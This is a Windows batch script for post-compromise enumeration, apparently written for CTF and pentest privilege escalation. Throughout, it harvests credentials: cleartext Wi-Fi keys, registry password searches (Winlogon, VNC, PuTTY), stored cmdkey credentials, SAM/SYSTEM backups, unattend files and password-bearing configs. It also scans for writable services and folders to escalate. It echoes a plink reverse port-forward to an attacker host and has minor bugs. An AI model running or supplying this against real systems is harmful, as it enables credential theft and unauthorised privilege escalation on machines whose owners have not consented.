REM Windows Enumeration Batch Script
REM Author: GrimmVenom
REM Original Authors:
REM https://github.com/azmatt/windowsEnum/blob/master/windowsEnum.bat
REM https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat
REM Resources:
REM https://www.fuzzysecurity.com/tutorials/16.html
REM http://toshellandback.com/2015/11/24/ms-priv-esc/
REM http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
REM https://github.com/ankh2054/windows-pentest/blob/master/Powershell/folderperms.ps1

REM Prerequisites:
REM Download wget.exe from attacking machine
REM Download accesschk.exe from sysinsternals (old version with accepteula)

set "output=enum.txt"

@echo off
REM SYSTEM INFO:
echo "##################"  >> output.txt
echo "SYSTEM INFO:" >> output.txt
echo ##################  >> output.txt
echo "----- HOSTNAME: ---------" >> output.txt
hostname >> output.txt
echo. >> output.txt
systeminfo >> output.txt

echo "----- Architecture -------" >> output.txt
SET Processor >> output.txt
echo. >> output.txt
echo "------- Powershell existence/version check -------" >> output.txt
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "------- Patches (also listed as part of systeminfo) -------" >> output.txt
:: Note on some legacy Windows editions WMIC may fail to install/start/freeze in which case you'll need to comment out any calls to wmic
:: Systeminfo may at times fail to list all patches (instead showing 'file x' or something along those lines) in which case its important to have this fallback.
wmic qfe get Caption,Description,HotFixID,InstalledOn >> output.txt
echo. >> output.txt
echo. >> output.txt

echo "---Domain joined? If so check domain controller for GPP files ----" >> output.txt
set user
echo. >> output.txt
:: cd %userprofile%
echo "---Unquoted Service Paths (requires that the directory from which this script is run is user writeable. If it is not, you can use the WMIC command below) ---" >> output.txt
REM wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
sc query state= all > scoutput.txt
findstr "SERVICE_NAME:" scoutput.txt > Servicenames.txt
FOR /F "tokens=2 delims= " %%i in (Servicenames.txt) DO @echo %%i >> services.txt
FOR /F %%i in (services.txt) DO @sc qc %%i | findstr "BINARY_PATH_NAME" >> path.txt
find /v """" path.txt > unquotedpaths.txt
sort unquotedpaths.txt|findstr /i /v C:\WINDOWS
del /f Servicenames.txt
del /f services.txt
del /f path.txt
del /f scoutput.txt
del /f unquotedpaths.txt
echo.

REM END SYSTEM INFO


REM USER ENUMERATION
echo "##################"  >> output.txt
echo "SYSTEM USERS:" >> output.txt
echo ################## >> output.txt
echo ------- CURRENT USER -------- >> output.txt
net user %USERNAME% >> output.txt
echo. >> output.txt
echo "whoami: " >> output.txt
whoami >> output.txt
echo "Current User: %username%" >> output.txt
echo. >> output.txt

echo ------- Administrators -------- >> output.txt
net localgroup administrators >> output.txt
echo --- All users, accounts and groups --- >> output.txt

echo "------- net users: -----------" >> output.txt
net users >> output.txt
echo. >> output.txt

echo "------- net accounts: --------" >> output.txt
net accounts >> output.txt
echo. >> output.txt

echo "------- net localgroup: ------" >> output.txt
net localgroup >> output.txt
echo. >> output.txt

echo "------ whoami /all: ----------" >> output.xt
whoami /all >> output.txt
echo. >> output.txt
echo. >> output.txt
REM END USER ENUMERATION


REM DUMP ENVIRONMENTAL VARIABLES
echo "##################"  >> output.txt
echo "Environment Variables:" >> output.txt
echo "##################"  >> output.txt
set >> output.txt
echo "PATH: %PATH%"" >> output.txt
echo. >> output.txt
echo. >> output.txt
REM END DUMP ENVIRONMENTAL VARIABLES


REM DRIVE INFO
echo "##################"  >> output.txt
echo "FSUTIL FSINFO DRIVES" >> output.txt
echo "(shows mounted drives)" >> output.txt
echo "##################"  >> output.txt
fsutil fsinfo drives >> output.txt
echo. >> output.txt

echo "------- Network shares -------" >> output.txt
net share >> output.txt
echo. >> output.txt
REM END DRIVE INFO


REM SERVICES
echo "##################"  >> output.txt
echo "SERVICES:" >> output.txt
echo "##################"  >> output.txt
echo "------- Scheduled Tasks Names Only -------" >> output.txt
:: Look for any interesting/non-standard scheduled tasks, then view the scheduled task details list below to get a better idea of what that task is doing and who is running it).
schtasks /query /fo LIST 2>nul | findstr "TaskName" >> output.txt
:: schtasks /query /fo LIST /v >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "------- Scheduled Tasks Details (taskname, author, command run, run as user) -------" >> output.txt
schtasks /query /fo LIST /v | findstr "TaskName Author: Run: User:" >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "------- Services Currently Running (check for Windows Defender or Anti-virus) ---------" >> output.txt
net start >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "------- Link Running Processes to started services --------" >> output.txt
tasklist /SVC >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "------- Programs that run at startup ------" >> output.txt
:: Note on some legacy Windows editions WMIC may fail to install/start/freeze in which case you'll need to comment out any calls to wmic
wmic startup get caption,command >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "------- DRIVERQUERY -------------" >> output.txt
DRIVERQUERY >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "------- Checking for services which aren't properly quoted -------------" >> output.txt
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """ >> output.txt
echo. >> output.txt
echo. >> output.txt

:: Requires accesschk.exe from sysinternals
echo "#### Checking for vulnerable services that can be modified by unprivlidged users" >> output.txt
accesschk.exe -uwcqv "Authenticated Users" * /accepteula >> output.txt
accesschk.exe -uwcqv "Users" * /accepteula >> output.txt
accesschk.exe -uwcqv "Everyone" * /accepteula >> output.txt
echo. >> output.txt
echo. >> output.txt

echo. >> output.txt
REM END SERVICES


REM NETWORK INFO:
echo ##################################################### >> output.txt
echo "Network Information:" >> output.txt
echo ##################################################### >> output.txt

echo "---------------- ipconfig /all -----------------------" >> output.txt
ipconfig /all >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "---------------- net use (view current connections)---" >> output.txt
net use >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "---------------- net share (view shares) -------------" >> output.txt
net share >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "---------------- arp -a ------------------------------" >> output.txt
arp -a >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "---------------- route print -------------------------" >> output.txt
route print >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "----------------  -nao ------------------------" >> output.txt
echo "REVERSE PORT FORWARD MULTIPLE PORTS AT ONCE: plink.exe -l username -pw mysecretpassword -P [port] 10.11.0.108 -R 8080:127.0.0.1:8080 -R 8000:127.0.0.1:8000 -R 443:127.0.0.1:443" >> output.txt
netstat -nao >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "---------------- netsh firewall show state -----------" >> output.txt
netsh firewall show state >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "---------------- netsh firewall show config ----------" >> output.txt
netsh firewall show config >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "---------------- netsh firewall advanced  ------------" >> output.txt
netsh advfirewall firewall dump >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "---------------- netsh wlan export profile key=clear ----------" >> output.txt
netsh wlan export profile key=clear >> output.txt
echo. >> output.txt
echo "---------------- Shows wireless network information ----------" >> output.txt
type wi-fi*.xml >> output.txt
del wi-fi*.xml
echo. >> output.txt
echo. >> dir_output.txt
REM END NETWORK INFO


REM CREDENTIAL SEARCH
echo "##################"  >> output.txt
echo "CREDENTIAL SEARCH: " >> output.txt
echo "##################"  >> output.txt
echo "--- Searching Registry for Passwords ---" >> output.txt
reg query HKLM /f password  /t REG_SZ  /s >> output.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" >> output.txt
reg query HKLM /f password /t REG_SZ /s /k >> output.txt
reg query HKCU /f password /t REG_SZ /s /k >> output.txt
reg query "HKCU\Software\ORL\WinVNC3\Password" >> output.txt
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> output.txt
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "-- cmdkey stored passwords --" >> output.txt
echo 'To use stored cmdkey credentials use runas with /savecred flag (e.g. runas /savecred /user:ACCESS\Administrator "ping <ip>")' >> output.txt
cmdkey /list >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--- AlwaysInstallElevated Check ---" >> output.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> output.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> output.txt
echo. >> output.txt
echo "################## Checking for files with pass, cred, vnc or .config in the name" >> output.txt
echo "--------------- dir /s *pass* ----------------------------------" >> output.txt
dir /s *pass*  >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--------------- dir /s *cred* ----------------------------------" >> output.txt
dir /s *cred* >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--------------- dir /s *vnc*  ----------------------------------" >> output.txt
dir /s *vnc*  >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--------------- dir /s *.config ----------------------------------" >> output.txt
dir /s *.config  >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--------------- dir /s groups.xml --------------------------------" >> output.txt
dir /s groups.xml  >> output.txt
echo. >> output.txt
echo "--------------- dir /s ScheduledTasks.xml  -----------------------" >> output.txt
dir /s ScheduledTasks.xml  >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--------------- dir /s printers.xml  -----------------------------" >> output.txt
dir /s printers.xml  >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--------------- dir /s drives.xml  -------------------------------" >> output.txt
dir /s drives.xml  >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--------------- dir /s DataSources.xml  --------------------------" >> output.txt
dir /s DataSources.xml  >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--------------- dir /s web.config  -------------------------------" >> output.txt
dir /s web.config  >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--- Broad search for any possible config files which may contain passwords ---" >> output.txt
:: The following broad config file and credential searches could result in many results. They are meant as a fall back once you have already done thorough enumeration of user directories, web directories, and program directories (in addition to having pillaged the db).
dir /s /b *pass* *cred* *vnc* *.config* >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "--- Starting broad search in the background for any files with the word password in it. Press enter to get status occasionally --" >> output.txt
start /b findstr /sim password *.xml *.ini *.txt *.config *.bak 2>nul >> output.txt
echo. >> output.txt
echo. >> output.txt
REM END CREDENTIAL SEARCH


REM UNATTENDED INSTALL FILES
:: output to dir_output.txt
echo ################## Checking for unattended install files > dir_output.txt
echo "--------------- Broad Search for common files --------------------" >> dir_output.txt
dir /b /s unattended.xml* sysprep.xml* sysprep.inf* unattend.xml* >> dir_output.txt
echo. >> dir_output.txt
echo. >> dir_output.txt
echo "--------------- type c:\sysprep\sysprep.xml ----------------------" >> dir_output.txt
type c:\sysprep\sysprep.xml >> dir_output.txt
echo. >> dir_output.txt
echo. >> dir_output.txt
echo "--------------- Checking for c:\sysprep.inf ----------------------" >> dir_output.txt
type c:\sysprep.inf >> dir_output.txt
echo. >> dir_output.txt
echo. >> dir_output.txt
echo "--------------- Checking for c:\sysprep\sysprep.xml --------------" >> dir_output.txt
type c:\sysprep\sysprep.xml >> dir_output.txt
echo. >> dir_output.txt
echo. >> dir_output.txt
echo "--------------- dir /s unattended.xml ----------------------------" >> dir_output.txt
dir /s unattended.xml  >> dir_output.txt
echo. >> dir_output.txt
echo. >> dir_output.txt
echo "--------------- dir /s unattend.xml ------------------------------" >> dir_output.txt
dir /s unattend.xml  >> dir_output.txt
echo. >> dir_output.txt
echo. >> dir_output.txt
echo "--------------- dir /s  autounattend.xml -------------------------" >> dir_output.txt
dir /s autounattend.xml >> dir_output.txt
echo. >> dir_output.txt
echo. >> dir_output.txt
echo "--------------- Checking for backup SAM files --------------------" >> dir_output.txt
echo "### dir %SYSTEMROOT%\repair\SAM" >> dir_output.txt
dir %%SYSTEMROOT%%\repair\SAM >> dir_output.txt
echo. >> dir_output.txt
echo "### dir %SYSTEMROOT%\system32\config\regback\SAM" >> dir_output.txt
dir %%SYSTEMROOT%%\system32\config\regback\SAM >> dir_output.txt
echo. >> dir_output.txt
echo. >> dir_output.txt
REM END UNATTENDED INSTALL FILES


REM ACCESSCHK
echo "##################"  >> output.txt
echo "Checking if .msi files are always installed with elevated privileges" >> output.txt
echo "NOTE: Both values below must be 1" >> output.txt
echo "##################"  >> output.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> output.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> output.txt
echo. >> output.txt
echo. >> output.txt
echo "##################"  >> output.txt
echo "AccessChk (checks permissions for Authenticated Users, Everyone, and Users) " >> output.txt
echo "##################"  >> output.txt
reg.exe ADD "HKCU\Software\Sysinternals\AccessChk" /v EulaAccepted /t REG_DWORD /d 1 /f >> output.txt
echo. >> output.txt
echo "--- Accesschk World writeable folders and files ----" >> output.txt
accesschk.exe -uwdqs "Users" c:\ /accepteula >> output.txt
accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula >> output.txt
accesschk.exe -qwsu "Everyone" * /accepteula >> output.txt
accesschk.exe -qwsu "Authenticated Users" * /accepteula >> output.txt
accesschk.exe -qwsu "Users" * /accepteula >> output.txt
echo. >> output.txt
echo. >> output.txt
echo  "--- Accesschk services with weak permissions ---" >> output.txt
accesschk.exe -uwcqv "Authenticated Users" * /accepteula >> output.txt
accesschk.exe -uwcqv "Everyone" * /accepteula >> output.txt
accesschk.exe -uwcqv "Users" * /accepteula >> output.txt
echo. >> output.txt
echo. >> output.txt
echo  "--- Accesschk services that we can change registry values for (such as ImagePath) ---" >> output.txt
accesschk.exe -kvqwsu "Everyone" hklm\system\currentcontrolset\services /accepteula >> output.txt
accesschk.exe -kvqwsu "Authenticated Users" hklm\system\currentcontrolset\services /accepteula >> output.txt
accesschk.exe -kvqwsu "Users" hklm\system\currentcontrolset\services /accepteula >> output.txt
echo. >> output.txt
echo. >> output.txt
REM END ACCESSCHK


REM TREE
echo "############## RUNNING TREE FROM C:\ ######################" >> output.txt
echo "---------- output saved to tree_output.txt -----------------" >> output.txt
tree C:\ /f /a > tree_output.txt
echo. >> output.txt
REM END TREE


REM Quick Wins
echo ##################################################### > quick_wins.txt
echo "SEARCH FOR QUICK WINS" >> quick_wins.txt
echo ##################################################### >> quick_wins.txt
echo "-------- Listing contents of user directories ---------" >> quick_wins.txt
:: In CTF machines it is VERY common for there to be artifacts used for privilege escalation within user directories. Pay special attention for files that may contain credentials, or files that maybe used as part of a scheduled task. You can typically ignore most default windows files (some of which have been filtered out as part of this script).
dir "C:\Users\" /a /b /s 2>nul | findstr /v /i "Favorites\\" | findstr /v /i "AppData\\" | findstr /v /i "Microsoft\\" |  findstr /v /i "Application Data\\" >> quick_wins.txt
dir "C:\Documents and Settings\" /a /b /s 2>nul | findstr /v /i "Favorites\\" | findstr /v /i "AppData\\" | findstr /v /i "Microsoft\\" |  findstr /v /i "Application Data\\" >> quick_wins.txt
echo. >> quick_wins.txt

echo "--- Checking for Inetpub ---" >> quick_wins.txt
:: The root web folder can at times be extensive, and thus we do not always want to show a recursive listing of its contents in this script but it should always be investigated regardless.
dir /a /b C:\inetpub\ >> quick_wins.txt
echo. >> quick_wins.txt
echo. >> quick_wins.txt
echo --- Broad search for Apache or Xampp --- >> quick_wins.txt
dir /s /b apache* xampp* >> quick_wins.txt
echo. >> quick_wins.txt
echo. >> quick_wins.txt

echo ---Search for Configuration and sensitive files--- >> quick_wins.txt
echo -- Broad search for config files -- >> quick_wins.txt
:: If the .NET framework is installed you will get a bunch of config files which are typically default and can be ignored. The more you practice priv esc. the more youll learn which files can be ignored, and which you should give a closer eye to.
dir /s /b php.ini httpd.conf httpd-xampp.conf my.ini my.cnf web.config >> quick_wins.txt
echo. >> quick_wins.txt
echo. >> quick_wins.txt
echo "-- Application Host File --" >> quick_wins.txt
type C:\Windows\System32\inetsrv\config\applicationHost.config 2>nul >> quick_wins.txt
echo. >> quick_wins.txt
echo. >> quick_wins.txt

echo "-- Checking for any accessible SAM or SYSTEM files --" >> quick_wins.txt
dir %SYSTEMROOT%\repair\SAM 2>nul >> quick_wins.txt
dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul >> quick_wins.txt
dir %SYSTEMROOT%\System32\config\SAM 2>nul >> quick_wins.txt
dir %SYSTEMROOT%\repair\system 2>nul >> quick_wins.txt
dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul >> quick_wins.txt
dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul >> quick_wins.txt
dir /a /b /s SAM.b* >> quick_wins.txt
echo. >> quick_wins.txt

echo "-- Broad search for vnc kdbx or rdp files --" >> quick_wins.txt
dir /a /s /b *.kdbx *vnc.ini *.rdp >> quick_wins.txt
echo. >> quick_wins.txt

echo "--- Program Files and User Directories where everybody (or users) have full or modify permissions ---" >> quick_wins.txt
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone" >> quick_wins.txt
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone" >> quick_wins.txt
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone" >> quick_wins.txt
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone" >> quick_wins.txt
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone" >> quick_wins.txt
icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone" >> quick_wins.txt
icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone" >> quick_wins.txt
icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone" >> quick_wins.txt
icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" >> quick_wins.txt
icacls "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" >> quick_wins.txt
echo. >> quick_wins.txt
echo. >> quick_wins.txt
echo "---performing same checks but using cacls instead of icacls (for older versions of Windows)--" >> quick_wins.txt
cacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone" >> quick_wins.txt
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone" >> quick_wins.txt
cacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone" >> quick_wins.txt
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone" >> quick_wins.txt
cacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone" >> quick_wins.txt
cacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone" >> quick_wins.txt
cacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone" >> quick_wins.txt
cacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone" >> quick_wins.txt
cacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" >> quick_wins.txt
cacls "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" >> quick_wins.txt
echo. >> quick_wins.txt
echo. >> quick_wins.txt
echo ---------------------------------------- End Search for Quick Wins --------------------------------------
REM END Quick Wins


REM CLEANUP
echo ##################################################### >> output.txt
echo ################## Switching to the c:\ directory and making a c:\temp directory for dir scans >> output.txt
echo ##################################################### >> output.txt
mkdir c:\temp
copy output.txt c:\temp\output.txt
copy dir_output.txt c:\temp\dir_output.txt
copy tree_output.txt c:\temp\tree_output.txt
copy quick_wins.txt c:\temp\quick_wins.txt
REM END CLEANUP


